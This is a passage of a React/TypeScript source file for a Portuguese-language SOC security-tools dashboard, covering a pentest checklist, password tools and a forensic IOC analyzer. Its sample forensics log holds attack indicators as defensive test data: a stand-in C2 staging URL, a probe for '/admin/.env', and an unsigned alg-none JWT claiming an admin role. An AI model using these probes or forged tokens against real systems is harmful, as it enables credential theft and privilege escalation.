"use client";

import React, { useCallback, useEffect, useState } from "react";
import {
  AlertTriangle,
  Check,
  CheckCircle2,
  Copy,
  Crosshair,
  Fingerprint,
  KeyRound,
  Loader2,
  Lock,
  Play,
  RefreshCw,
  Shield,
  ShieldAlert,
  Skull,
  Wifi,
} from "lucide-react";

import {
  analyzeDdosTool,
  analyzeFirewallTool,
  analyzeForensicsTool,
  analyzeMalwareTool,
  analyzePasswordTool,
  analyzeWifiTool,
  type AssetResponse,
  type DdosAnalyzeResponse,
  type DdosPostureConfig,
  fetchHostWifiBridgeScan,
  fetchPentestPlan,
  type FirewallAnalyzeResponse,
  type ForensicsAnalyzeResponse,
  generatePasswordTool,
  type MalwareAnalyzeResponse,
  type PasswordAnalyzeResponse,
  type PasswordGenerateResponse,
  type PentestPlanResponse,
  scanLocalWifiTool,
  type WifiAnalyzeResponse,
  type WifiNetworkInput,
} from "@/lib/api";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

type SecurityToolId =
  | "pentest"
  | "password"
  | "forensics"
  | "firewall"
  | "malware"
  | "wifi"
  | "ddos";

interface ToolCardSpec {
  id: SecurityToolId;
  title: string;
  subtitle: string;
  badge?: string;
  iconBg: string;
  iconColor: string;
  borderActive: string;
  Icon: React.ComponentType<{ className?: string }>;
}

const TOOL_CARDS: ToolCardSpec[] = [
  {
    id: "pentest",
    title: "Pentest Assistant",
    subtitle: "Testes de penetração guiados",
    badge: "PRO",
    iconBg: "bg-red-500/15 border-red-500/30",
    iconColor: "text-red-400",
    borderActive: "border-red-500/50 bg-red-500/5",
    Icon: Shield,
  },
  {
    id: "password",
    title: "Password Tools",
    subtitle: "Geração e análise de senhas",
    iconBg: "bg-amber-500/15 border-amber-500/30",
    iconColor: "text-amber-400",
    borderActive: "border-amber-500/50 bg-amber-500/5",
    Icon: KeyRound,
  },
  {
    id: "forensics",
    title: "Forensics",
    subtitle: "Análise forense digital",
    iconBg: "bg-pink-500/15 border-pink-500/30",
    iconColor: "text-pink-400",
    borderActive: "border-pink-500/50 bg-pink-500/5",
    Icon: Fingerprint,
  },
  {
    id: "firewall",
    title: "Firewall Tester",
    subtitle: "Teste regras de firewall",
    iconBg: "bg-yellow-500/15 border-yellow-500/30",
    iconColor: "text-yellow-400",
    borderActive: "border-yellow-500/50 bg-yellow-500/5",
    Icon: ShieldAlert,
  },
  {
    id: "malware",
    title: "Malware Analysis",
    subtitle: "Análise de malwares e payloads",
    iconBg: "bg-rose-500/15 border-rose-500/30",
    iconColor: "text-rose-400",
    borderActive: "border-rose-500/50 bg-rose-500/5",
    Icon: Skull,
  },
  {
    id: "wifi",
    title: "WiFi Auditor",
    subtitle: "Auditoria de redes sem fio",
    iconBg: "bg-sky-500/15 border-sky-500/30",
    iconColor: "text-sky-400",
    borderActive: "border-sky-500/50 bg-sky-500/5",
    Icon: Wifi,
  },
  {
    id: "ddos",
    title: "DDoS Analyzer",
    subtitle: "Análise e mitigação de DDoS",
    iconBg: "bg-orange-500/15 border-orange-500/30",
    iconColor: "text-orange-400",
    borderActive: "border-orange-500/50 bg-orange-500/5",
    Icon: Crosshair,
  },
];

function severityBadgeVariant(
  severity: string
): "critical" | "warning" | "default" | "outline" | "success" {
  switch (severity) {
    case "CRITICAL":
      return "critical";
    case "HIGH":
      return "warning";
    case "MEDIUM":
      return "default";
    case "LOW":
    case "INFO":
      return "outline";
    default:
      return "outline";
  }
}

function CopyTextButton({ value, label = "Copiar" }: { value: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <Button
      type="button"
      size="sm"
      variant="outline"
      onClick={() => {
        if (typeof navigator !== "undefined" && navigator.clipboard) {
          void navigator.clipboard.writeText(value);
          setCopied(true);
          setTimeout(() => setCopied(false), 1800);
        }
      }}
    >
      {copied ? (
        <>
          <Check className="h-3.5 w-3.5 mr-1 text-emerald-400" />
          Copiado
        </>
      ) : (
        <>
          <Copy className="h-3.5 w-3.5 mr-1" />
          {label}
        </>
      )}
    </Button>
  );
}

export interface SecurityToolsPanelProps {
  token: string | null;
  assets: AssetResponse[];
  onNavigateToScans?: () => void;
}

export function SecurityToolsPanel({
  token,
  assets,
  onNavigateToScans,
}: SecurityToolsPanelProps) {
  const [activeTool, setActiveTool] = useState<SecurityToolId>("pentest");

  return (
    <div className="space-y-6">
      {/* Launcher Hub estilo SOC inspirado no catálogo de ferramentas */}
      <Card>
        <CardHeader className="pb-3">
          <div className="flex flex-wrap items-center justify-between gap-3">
            <div className="flex items-center gap-2">
              <Shield className="h-4 w-4 text-red-400" />
              <CardTitle className="text-xs font-bold tracking-wider uppercase text-slate-500 dark:text-slate-400">
                SEGURANÇA &amp; FERRAMENTAS SOC
              </CardTitle>
            </div>
            <Badge variant="outline">
              <Lock className="h-3 w-3 mr-1" />
              Análise Defensiva &amp; Estática (Zero Ataques Destrutivos)
            </Badge>
          </div>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
            {TOOL_CARDS.map((card) => {
              const isSelected = activeTool === card.id;
              const Icon = card.Icon;
              return (
                <button
                  key={card.id}
                  type="button"
                  onClick={() => setActiveTool(card.id)}
                  aria-pressed={isSelected}
                  className={`group text-left flex items-center gap-4 p-3.5 rounded-lg border transition-all ${
                    isSelected
                      ? `${card.borderActive} ring-1 ring-inset ring-slate-400/20`
                      : "border-slate-200 dark:border-slate-800 bg-slate-50/60 dark:bg-slate-900/50 hover:bg-slate-100 dark:hover:bg-slate-800/70"
                  }`}
                >
                  <div
                    className={`h-11 w-11 rounded-lg border flex items-center justify-center shrink-0 ${card.iconBg}`}
                  >
                    <Icon className={`h-5 w-5 ${card.iconColor}`} />
                  </div>
                  <div className="min-w-0 flex-1">
                    <div className="flex items-center gap-2">
                      <span className="font-semibold text-sm text-slate-900 dark:text-slate-100">
                        {card.title}
                      </span>
                      {card.badge && (
                        <span className="px-1.5 py-0.5 text-[10px] font-bold tracking-wide rounded bg-red-500/20 text-red-400 border border-red-500/30">
                          {card.badge}
                        </span>
                      )}
                    </div>
                    <p className="text-xs text-slate-500 dark:text-slate-400 truncate mt-0.5">
                      {card.subtitle}
                    </p>
                  </div>
                </button>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Área de Trabalho da Ferramenta Selecionada */}
      {activeTool === "pentest" && (
        <PentestAssistantWorkspace
          token={token}
          assets={assets}
          onNavigateToScans={onNavigateToScans}
        />
      )}
      {activeTool === "password" && <PasswordToolsWorkspace token={token} />}
      {activeTool === "forensics" && <ForensicsWorkspace token={token} />}
      {activeTool === "firewall" && <FirewallTesterWorkspace token={token} />}
      {activeTool === "malware" && <MalwareAnalysisWorkspace token={token} />}
      {activeTool === "wifi" && <WifiAuditorWorkspace token={token} />}
      {activeTool === "ddos" && (
        <DdosAnalyzerWorkspace token={token} assets={assets} />
      )}
    </div>
  );
}

// ---------------------------------------------------------------------------
// 1. Pentest Assistant
// ---------------------------------------------------------------------------

function PentestAssistantWorkspace({
  token,
  assets,
  onNavigateToScans,
}: {
  token: string | null;
  assets: AssetResponse[];
  onNavigateToScans?: () => void;
}) {
  const [selectedAssetId, setSelectedAssetId] = useState<string>("");
  const [assetType, setAssetType] = useState<
    "WEB_APP" | "REST_API" | "GRAPHQL_API" | "DOMAIN"
  >("WEB_APP");
  const [environment, setEnvironment] = useState<
    "PRODUCTION" | "STAGING" | "DEVELOPMENT" | "LAB"
  >("LAB");
  const [targetLabel, setTargetLabel] = useState<string>(
    "Aplicação de Laboratório Local"
  );
  const [plan, setPlan] = useState<PentestPlanResponse | null>(null);
  const [completedSteps, setCompletedSteps] = useState<Record<string, boolean>>(
    {}
  );
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleGeneratePlan() {
    setLoading(true);
    setError(null);
    try {
      const result = await fetchPentestPlan(
        selectedAssetId
          ? { asset_id: selectedAssetId }
          : {
              asset_type: assetType,
              environment,
              target_label: targetLabel,
            },
        token
      );
      setPlan(result);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro ao gerar roteiro WSTG."
      );
    } finally {
      setLoading(false);
    }
  }

  const checkedCount = plan
    ? plan.phases
        .flatMap((p) => p.steps)
        .filter((s) => completedSteps[s.step_id]).length
    : 0;

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <Shield className="h-5 w-5 text-red-400" />
              Pentest Assistant · Roteiro Guiado OWASP WSTG
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Orquestra etapas técnicas não destrutivas correlacionadas aos 53
              checks (`CHK-*`) e guardrails de produção.
            </p>
          </div>
          {onNavigateToScans && (
            <Button
              type="button"
              size="sm"
              variant="outline"
              onClick={onNavigateToScans}
            >
              Abrir Auditorias &amp; Scans
            </Button>
          )}
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
          {token && assets.length > 0 && (
            <div>
              <label
                htmlFor="pt-asset-select"
                className="block text-xs font-medium mb-1"
              >
                Ativo Autorizado (opcional)
              </label>
              <select
                id="pt-asset-select"
                value={selectedAssetId}
                onChange={(e) => setSelectedAssetId(e.target.value)}
                className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5 text-xs"
              >
                <option value="">Planejamento manual (sem ativo)</option>
                {assets.map((a) => (
                  <option key={a.id} value={a.id}>
                    {a.name} ({a.environment} · {a.authorization_status})
                  </option>
                ))}
              </select>
            </div>
          )}

          <div>
            <label
              htmlFor="pt-asset-type"
              className="block text-xs font-medium mb-1"
            >
              Tipo de Alvo
            </label>
            <select
              id="pt-asset-type"
              disabled={Boolean(selectedAssetId)}
              value={assetType}
              onChange={(e) =>
                setAssetType(
                  e.target.value as
                    | "WEB_APP"
                    | "REST_API"
                    | "GRAPHQL_API"
                    | "DOMAIN"
                )
              }
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5 text-xs disabled:opacity-50"
            >
              <option value="WEB_APP">WEB_APP</option>
              <option value="REST_API">REST_API</option>
              <option value="GRAPHQL_API">GRAPHQL_API</option>
              <option value="DOMAIN">DOMAIN</option>
            </select>
          </div>

          <div>
            <label htmlFor="pt-env" className="block text-xs font-medium mb-1">
              Ambiente
            </label>
            <select
              id="pt-env"
              disabled={Boolean(selectedAssetId)}
              value={environment}
              onChange={(e) =>
                setEnvironment(
                  e.target.value as
                    | "PRODUCTION"
                    | "STAGING"
                    | "DEVELOPMENT"
                    | "LAB"
                )
              }
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5 text-xs disabled:opacity-50"
            >
              <option value="LAB">LAB</option>
              <option value="DEVELOPMENT">DEVELOPMENT</option>
              <option value="STAGING">STAGING</option>
              <option value="PRODUCTION">PRODUCTION</option>
            </select>
          </div>

          <div>
            <label
              htmlFor="pt-label"
              className="block text-xs font-medium mb-1"
            >
              Identificação do Escopo
            </label>
            <input
              id="pt-label"
              type="text"
              disabled={Boolean(selectedAssetId)}
              value={targetLabel}
              onChange={(e) => setTargetLabel(e.target.value)}
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-2.5 text-xs disabled:opacity-50"
            />
          </div>
        </div>

        <Button
          type="button"
          onClick={handleGeneratePlan}
          disabled={loading}
        >
          {loading ? (
            <Loader2 className="h-4 w-4 mr-2 animate-spin" />
          ) : (
            <Play className="h-4 w-4 mr-2" />
          )}
          Gerar Roteiro Guiado OWASP WSTG
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {plan && (
          <div className="space-y-4 pt-2 border-t border-slate-200 dark:border-slate-800">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div className="flex flex-wrap items-center gap-2 text-xs">
                <Badge variant="default">{plan.target_name}</Badge>
                <Badge variant="outline">{plan.asset_type}</Badge>
                <Badge variant="outline">{plan.environment}</Badge>
                <Badge
                  variant={
                    plan.authorization_status === "VERIFIED"
                      ? "success"
                      : "warning"
                  }
                >
                  Autorização: {plan.authorization_status}
                </Badge>
              </div>
              <div className="text-xs text-slate-400">
                Checklist manual: <strong>{checkedCount}</strong>/
                {plan.total_steps} · Cobertos no motor:{" "}
                <strong>{plan.automated_covered_steps}</strong> · Achados abertos:{" "}
                <strong>{plan.open_findings_count}</strong>
              </div>
            </div>

            {plan.authorization_warning && (
              <div className="p-3 rounded-md border border-amber-500/40 bg-amber-500/10 text-xs text-amber-300 flex items-start gap-2">
                <AlertTriangle className="h-4 w-4 shrink-0 mt-0.5" />
                <span>{plan.authorization_warning}</span>
              </div>
            )}

            <div className="space-y-3">
              {plan.phases.map((phase) => (
                <div
                  key={phase.phase_number}
                  className="rounded-lg border border-slate-200 dark:border-slate-800 p-4 space-y-2.5"
                >
                  <div>
                    <h4 className="font-semibold text-sm">{phase.name}</h4>
                    <p className="text-xs text-slate-500 dark:text-slate-400">
                      {phase.description}
                    </p>
                  </div>
                  <div className="space-y-2">
                    {phase.steps.map((step) => (
                      <div
                        key={step.step_id}
                        className="p-3 rounded-md bg-slate-50 dark:bg-slate-900/60 border border-slate-200/80 dark:border-slate-800/80 flex flex-col gap-1.5"
                      >
                        <div className="flex flex-wrap items-center justify-between gap-2">
                          <label className="flex items-center gap-2 text-xs font-semibold cursor-pointer">
                            <input
                              type="checkbox"
                              checked={Boolean(completedSteps[step.step_id])}
                              onChange={(e) =>
                                setCompletedSteps((prev) => ({
                                  ...prev,
                                  [step.step_id]: e.target.checked,
                                }))
                              }
                            />
                            <span>
                              [{step.step_id}] {step.title}
                            </span>
                          </label>
                          <div className="flex items-center gap-1.5">
                            <Badge variant="outline">{step.wstg_ref}</Badge>
                            {step.automated_status === "COVERED_PASSED" && (
                              <Badge variant="success">Motor: Aprovado</Badge>
                            )}
                            {step.automated_status ===
                              "COVERED_WITH_FINDINGS" && (
                              <Badge variant="critical">
                                Motor: {step.related_findings_count} achado(s)
                              </Badge>
                            )}
                            {step.automated_status ===
                              "BLOCKED_IN_PRODUCTION" && (
                              <Badge variant="warning">
                                Bloqueado em Produção
                              </Badge>
                            )}
                            {step.automated_status === "NOT_YET_RUN" && (
                              <Badge variant="secondary">Pendente de Scan</Badge>
                            )}
                          </div>
                        </div>
                        <p className="text-xs text-slate-600 dark:text-slate-300">
                          <strong>Objetivo:</strong> {step.objective}
                        </p>
                        <p className="text-xs text-slate-500 dark:text-slate-400">
                          <strong>Técnica segura:</strong> {step.safe_technique}
                        </p>
                        <div className="flex flex-wrap gap-1 pt-0.5">
                          {step.mapped_checks.map((chk) => (
                            <span
                              key={chk}
                              className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300"
                            >
                              {chk}
                            </span>
                          ))}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 2. Password Tools
// ---------------------------------------------------------------------------

function PasswordToolsWorkspace({ token }: { token: string | null }) {
  const [mode, setMode] = useState<"RANDOM" | "PASSPHRASE">("RANDOM");
  const [length, setLength] = useState<number>(20);
  const [wordCount, setWordCount] = useState<number>(5);
  const [includeUpper, setIncludeUpper] = useState(true);
  const [includeLower, setIncludeLower] = useState(true);
  const [includeDigits, setIncludeDigits] = useState(true);
  const [includeSymbols, setIncludeSymbols] = useState(true);
  const [excludeAmbiguous, setExcludeAmbiguous] = useState(false);

  const [generatedResult, setGeneratedResult] =
    useState<PasswordGenerateResponse | null>(null);
  const [passwordToAnalyze, setPasswordToAnalyze] = useState("");
  const [analysisResult, setAnalysisResult] =
    useState<PasswordAnalyzeResponse | null>(null);
  const [loadingGen, setLoadingGen] = useState(false);
  const [loadingAna, setLoadingAna] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleGenerate() {
    setLoadingGen(true);
    setError(null);
    try {
      const res = await generatePasswordTool(
        mode === "RANDOM"
          ? {
              mode,
              length,
              include_uppercase: includeUpper,
              include_lowercase: includeLower,
              include_digits: includeDigits,
              include_symbols: includeSymbols,
              exclude_ambiguous: excludeAmbiguous,
            }
          : {
              mode,
              word_count: wordCount,
              separator: "-",
              include_number: true,
            },
        token
      );
      setGeneratedResult(res);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Erro ao gerar senha.");
    } finally {
      setLoadingGen(false);
    }
  }

  async function handleAnalyze(targetPwd?: string) {
    const pwd = targetPwd ?? passwordToAnalyze;
    if (!pwd) return;
    setLoadingAna(true);
    setError(null);
    try {
      const res = await analyzePasswordTool(pwd, token);
      setAnalysisResult(res);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Erro ao analisar senha.");
    } finally {
      setLoadingAna(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2 text-base">
          <KeyRound className="h-5 w-5 text-amber-400" />
          Password Tools · Geração CSPRNG e Auditoria de Força
        </CardTitle>
        <p className="text-xs text-slate-500 dark:text-slate-400">
          Nenhuma senha gerada ou analisada é armazenada no banco de dados ou
          registrada na trilha de auditoria.
        </p>
      </CardHeader>
      <CardContent className="space-y-4">
        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          {/* Gerador */}
          <div className="space-y-3 p-4 rounded-lg border border-slate-200 dark:border-slate-800">
            <h4 className="font-semibold text-sm">Gerador Criptográfico</h4>
            <div className="flex gap-2">
              <Button
                type="button"
                size="sm"
                variant={mode === "RANDOM" ? "default" : "outline"}
                onClick={() => setMode("RANDOM")}
              >
                Aleatória (Alta Entropia)
              </Button>
              <Button
                type="button"
                size="sm"
                variant={mode === "PASSPHRASE" ? "default" : "outline"}
                onClick={() => setMode("PASSPHRASE")}
              >
                Passphrase (Diceware)
              </Button>
            </div>

            {mode === "RANDOM" ? (
              <div className="space-y-2 text-xs">
                <label className="block">
                  Comprimento: <strong>{length}</strong> caracteres
                  <input
                    type="range"
                    min={8}
                    max={64}
                    value={length}
                    onChange={(e) => setLength(Number(e.target.value))}
                    className="w-full mt-1"
                  />
                </label>
                <div className="grid grid-cols-2 gap-2">
                  <label className="flex items-center gap-1.5">
                    <input
                      type="checkbox"
                      checked={includeUpper}
                      onChange={(e) => setIncludeUpper(e.target.checked)}
                    />
                    Maiúsculas (A-Z)
                  </label>
                  <label className="flex items-center gap-1.5">
                    <input
                      type="checkbox"
                      checked={includeLower}
                      onChange={(e) => setIncludeLower(e.target.checked)}
                    />
                    Minúsculas (a-z)
                  </label>
                  <label className="flex items-center gap-1.5">
                    <input
                      type="checkbox"
                      checked={includeDigits}
                      onChange={(e) => setIncludeDigits(e.target.checked)}
                    />
                    Dígitos (0-9)
                  </label>
                  <label className="flex items-center gap-1.5">
                    <input
                      type="checkbox"
                      checked={includeSymbols}
                      onChange={(e) => setIncludeSymbols(e.target.checked)}
                    />
                    Símbolos (!@#$...)
                  </label>
                  <label className="flex items-center gap-1.5 col-span-2">
                    <input
                      type="checkbox"
                      checked={excludeAmbiguous}
                      onChange={(e) => setExcludeAmbiguous(e.target.checked)}
                    />
                    Excluir caracteres ambíguos (0, O, 1, l, I)
                  </label>
                </div>
              </div>
            ) : (
              <div className="space-y-2 text-xs">
                <label className="block">
                  Quantidade de palavras: <strong>{wordCount}</strong>
                  <input
                    type="range"
                    min={4}
                    max={10}
                    value={wordCount}
                    onChange={(e) => setWordCount(Number(e.target.value))}
                    className="w-full mt-1"
                  />
                </label>
              </div>
            )}

            <Button
              type="button"
              onClick={handleGenerate}
              disabled={loadingGen}
            >
              {loadingGen && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
              Gerar Credencial Segura
            </Button>

            {generatedResult && (
              <div className="p-3 rounded-md bg-slate-100 dark:bg-slate-900 border border-slate-300 dark:border-slate-700 space-y-2">
                <div className="font-mono text-sm break-all select-all">
                  {generatedResult.generated}
                </div>
                <div className="flex flex-wrap items-center justify-between gap-2 text-xs">
                  <div className="flex items-center gap-2">
                    <Badge variant="success">
                      {generatedResult.strength_label}
                    </Badge>
                    <span className="text-slate-400">
                      {generatedResult.entropy_bits} bits ·{" "}
                      {generatedResult.length} chars
                    </span>
                  </div>
                  <div className="flex gap-1.5">
                    <CopyTextButton value={generatedResult.generated} />
                    <Button
                      type="button"
                      size="sm"
                      variant="secondary"
                      onClick={() => {
                        setPasswordToAnalyze(generatedResult.generated);
                        void handleAnalyze(generatedResult.generated);
                      }}
                    >
                      Auditar esta senha
                    </Button>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Analisador */}
          <div className="space-y-3 p-4 rounded-lg border border-slate-200 dark:border-slate-800">
            <h4 className="font-semibold text-sm">
              Analisador de Entropia &amp; Conformidade NIST/OWASP
            </h4>
            <div className="flex gap-2">
              <input
                type="password"
                aria-label="Senha para análise"
                placeholder="Digite ou cole uma senha para avaliar..."
                value={passwordToAnalyze}
                onChange={(e) => setPasswordToAnalyze(e.target.value)}
                className="flex-1 h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-3 text-xs"
              />
              <Button
                type="button"
                onClick={() => handleAnalyze()}
                disabled={loadingAna || !passwordToAnalyze}
              >
                {loadingAna && (
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                )}
                Analisar Senha
              </Button>
            </div>

            {analysisResult && (
              <div className="space-y-3 text-xs">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Badge
                      variant={
                        analysisResult.score >= 70
                          ? "success"
                          : analysisResult.score >= 45
                            ? "warning"
                            : "critical"
                      }
                    >
                      Score: {analysisResult.score}/100 (
                      {analysisResult.classification})
                    </Badge>
                  </div>
                  <span className="text-slate-400">
                    Entropia: {analysisResult.keyspace_entropy_bits} bits
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2 p-2.5 rounded bg-slate-100 dark:bg-slate-900/70">
                  <div>
                    <div className="text-slate-400">Argon2id/bcrypt (Lento)</div>
                    <div className="font-semibold">
                      {analysisResult.crack_time_offline_slow}
                    </div>
                  </div>
                  <div>
                    <div className="text-slate-400">GPU SHA-256 (Rápido)</div>
                    <div className="font-semibold">
                      {analysisResult.crack_time_offline_fast}
                    </div>
                  </div>
                </div>

                {analysisResult.detected_patterns.length > 0 && (
                  <div className="space-y-1">
                    <div className="font-semibold text-amber-400">
                      Fragilidades detectadas:
                    </div>
                    <ul className="list-disc pl-4 space-y-0.5 text-amber-300">
                      {analysisResult.detected_patterns.map((p) => (
                        <li key={p}>{p}</li>
                      ))}
                    </ul>
                  </div>
                )}

                <div className="space-y-1">
                  {analysisResult.compliance_checks.map((c) => (
                    <div
                      key={c.standard}
                      className="flex items-start gap-2 p-2 rounded border border-slate-200 dark:border-slate-800"
                    >
                      {c.passed ? (
                        <CheckCircle2 className="h-4 w-4 text-emerald-400 shrink-0" />
                      ) : (
                        <AlertTriangle className="h-4 w-4 text-red-400 shrink-0" />
                      )}
                      <div>
                        <div className="font-semibold">{c.standard}</div>
                        <div className="text-slate-400">{c.detail}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </CardContent>
    </Card>
  );
}

// ---------------------------------------------------------------------------
// 3. Forensics
// ---------------------------------------------------------------------------

const SAMPLE_FORENSICS_LOG = `2026-11-20T18:10:02Z WARN auth-gw client=198.51.100.77 path="/api/v1/login" status="401" ref="https://c2-lab.example.invalid/stage1?token=secret123"
2026-11-20T18:10:05Z ERROR proxy src=10.20.0.14 dst=198.51.100.77 "GET /admin/.env HTTP/1.1" 404 512
2026-11-20T18:10:09Z INFO validator CVE-2024-3094 sha256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
jwt_observed=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJsYWItdXNlciIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTcwMDAwMDAwMH0.`;

function ForensicsWorkspace({ token }: { token: string | null }) {
  const [artifactName, setArtifactName] = useState("incidente-lab.log");
  const [content, setContent] = useState("");
  const [defang, setDefang] = useState(true);
  const [result, setResult] = useState<ForensicsAnalyzeResponse | null>(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function handleAnalyze() {
    if (!content.trim()) return;
    setLoading(true);
    setError(null);
    try {
      const res = await analyzeForensicsTool(
        { content, artifact_name: artifactName, defang_iocs: defang },
        token
      );
      setResult(res);
    } catch (err) {
      setError(
        err instanceof Error ? err.message : "Erro na análise forense."
      );
    } finally {
      setLoading(false);
    }
  }

  return (
    <Card>
      <CardHeader>
        <div className="flex flex-wrap items-center justify-between gap-2">
          <div>
            <CardTitle className="flex items-center gap-2 text-base">
              <Fingerprint className="h-5 w-5 text-pink-400" />
              Forensics · Extração de IOCs, Hashes, Timeline e JWT
            </CardTitle>
            <p className="text-xs text-slate-500 dark:text-slate-400 mt-1">
              Calcula hashes criptográficos, extrai e realiza defang seguro de
              IOCs, reconstrói timeline de logs e detecta vazamento de
              credenciais.
            </p>
          </div>
          <Button
            type="button"
            size="sm"
            variant="outline"
            onClick={() => setContent(SAMPLE_FORENSICS_LOG)}
          >
            Carregar Exemplo de Laboratório
          </Button>
        </div>
      </CardHeader>
      <CardContent className="space-y-4">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
          <div className="md:col-span-2">
            <label
              htmlFor="forensics-name"
              className="block text-xs font-medium mb-1"
            >
              Nome do Artefato
            </label>
            <input
              id="forensics-name"
              type="text"
              value={artifactName}
              onChange={(e) => setArtifactName(e.target.value)}
              className="w-full h-9 rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 px-3 text-xs"
            />
          </div>
          <label className="flex items-center gap-2 text-xs pt-5">
            <input
              type="checkbox"
              checked={defang}
              onChange={(e) => setDefang(e.target.checked)}
            />
            Aplicar Defang em URLs, Domínios e IPs (`hxxp`, `[.]`)
          </label>
        </div>

        <textarea
          rows={6}
          aria-label="Conteúdo do artefato forense"
          placeholder="Cole logs de servidor, cabeçalhos HTTP, tokens JWT ou trechos suspeitos..."
          value={content}
          onChange={(e) => setContent(e.target.value)}
          className="w-full rounded-md border border-slate-300 dark:border-slate-700 bg-white dark:bg-slate-900 p-3 font-mono text-xs"
        />

        <Button
          type="button"
          onClick={handleAnalyze}
          disabled={loading || !content.trim()}
        >
          {loading && <Loader2 className="h-4 w-4 mr-2 animate-spin" />}
          Executar Análise Forense
        </Button>

        {error && (
          <div
            role="alert"
            className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-xs text-red-400"
          >
            {error}
          </div>
        )}

        {result && (
          <div className="space-y-4 pt-3 border-t border-slate-200 dark:border-slate-800 text-xs">
            <p className="font-medium text-slate-200">{result.summary}</p>

            {result.secret_leak_warnings.length > 0 && (
              <div className="p-3 rounded-md border border-red-500/40 bg-red-500/10 text-red-300 space-y-1">
                <div className="font-semibold">
                  Alertas de Exposição de Credenciais:
                </div>
                {result.secret_leak_warnings.map((w) => (
                  <div key={w}>• {w}</div>
                ))}
              </div>
            )}

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              <div className="p-3 rounded-md border border-slate-200 dark:border-slate-800 space-y-1 font-mono text-[11px]">
                <div className="font-sans font-semibold text-xs mb-1">
                  Integridade &amp; Entropia ({result.shannon_entropy} bits/byte)
                </div>
                <div className="truncate">MD5: {result.hashes.md5}</div>
                <div className="truncate">SHA1: {result.hashes.sha1}</div>
                <div className="truncate">SHA256: {result.hashes.sha256}</div>
              </div>

              <div className="p-3 rounded-md border border-slate-200 dark:border-slate-800 space-y-1">
                <div className="font-semibold">Linha do Tempo</div>
                <div>Eventos com timestamp: {result.timeline.events_detected}</div>
                <div>Início: {result.timeline.first_timestamp ?? "—"}</div>
                <div>Fim: {result.timeline.last_timestamp ?? "—"}</div>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="font-semibold mb-1">
                  IPv4 Públicos ({result.iocs.ipv4_public.length})
                </div>
                <div className="flex flex-wrap gap-1">
                  {result.iocs.ipv4_public.map((ip) => (
                    <Badge key={ip} variant="warning">
                      {ip}
                    </Badge>
                  ))}
                  {result.iocs.ipv4_public.length === 0 && (
                    <span className="text-slate-400">Nenhum</span>
                  )}
                </div>
              </div>
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="font-semibold mb-1">
                  URLs &amp; Domínios ({result.iocs.urls.length + result.iocs.domains.length})
                </div>
                <div className="flex flex-wrap gap-1">
                  {[...result.iocs.urls, ...result.iocs.domains]
                    .slice(0, 12)
                    .map((u) => (
                      <Badge key={u} variant="outline">
                        {u}
                      </Badge>
                    ))}
                </div>
              </div>
              <div className="p-3 rounded border border-slate-200 dark:border-slate-800">
                <div className="font-semibold mb-1">
                  CVEs &amp; Hashes ({result.iocs.cves.length + result.iocs.hashes.length})
                </div>
                <div className="flex flex-wrap gap-1">
                  {result.iocs.cves.map((c) => (
                    <Badge key={c} variant="critical">
                      {c}
                    </Badge>
                  ))}
                  {result.iocs.hashes.slice(0, 4).map((h) => (
                    <Badge key={h} variant="secondary">
                      {h.slice(0, 14)}...
                    </Badge>
                  ))}
                </div>
              </div>
            </div>

            {result.jwt_inspection.detected && (
